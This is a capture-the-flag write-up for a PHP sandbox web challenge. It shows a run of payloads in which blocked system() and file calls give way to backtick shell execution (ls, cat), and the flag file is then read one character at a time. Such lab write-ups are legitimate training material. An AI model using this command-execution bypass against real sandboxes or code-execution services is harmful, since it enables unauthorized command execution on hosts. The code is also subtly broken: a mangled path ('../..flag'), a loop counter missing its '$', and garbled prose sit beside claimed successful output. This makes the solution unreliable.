# **PHP Sandbox(150)**

#### tag : web, experimental

-----------------------------------------------------------------

#### Description

>We Have created an experimental PHP sandbox. Give it a go!

-----------------------------------------------------------------

#### Challenge

~~~
<?php
$out = system('ls');
echo $out;
?>
~~~

~~~
Output of size 0 was generated. The last line of output is:
~~~

First, I try to use exec and system function. But I figure out it's prohibited.

~~~
<?php
$f = fopen('../../flag.txt','r');
$out = fgets($f);
echo $out;
?>
~~~

~~~
Output of size 0 was generated. The last line of output is:
~~~

Second, I try to use file stream to read flag file. But it's prohibited too.

~~~
<?php
$out = `ls`;
echo $out;
?>
~~~

~~~
Output of size 141206 was generated. The last line of output is:
~~~

Third, I try to use val = system command to run $value in system. And I can find this way is working.

~~~
<?php
$out = `ls flag`;
echo $out;
?>
~~~

~~~
Output of size 0 was generated. The last line of output is:
~~~

~~~
<?php
$out = `ls ../flag`;
echo $out;
?>
~~~

~~~
Output of size 0 was generated. The last line of output is:
~~~

~~~
<?php
$out = `ls ../..flag`;
echo $out;
?>
~~~

~~~
Output of size 15 was generated. The last line of output is:
~~~

I can find flag.txt in path ../../,

~~~
<?php
$out = `cat ../..flag`;
echo $out;
?>
~~~

~~~
Output of size 32 was generated. The last line of output is:
~~~

Output tell me file length is 32 byte, but output is nothing. Because there is newline at end of file.

So I have to access to data by index.

~~~
<?php
$out = `cat ../..flag`;
echo $out[0];
?>
~~~

~~~
Output of size 1 was generated. The last line of output is: g
~~~

 Yes, I am able to echo flag by index.

-----------------------------------------------------------------

#### Solution

~~~
<?php
$flag = `cat ../..flag`;
$solve = "";
for($i=0; $i<=30; i++) {
  $solve = $solve.$flag[$i];
}
echo $solve;
?>
~~~

~~~
Output of size 31 was generated. The last line of output is: go-sandbox-yourself-with-a-kiwi
~~~

### **flag go-sandbox-yourself-with-a-kiwi**
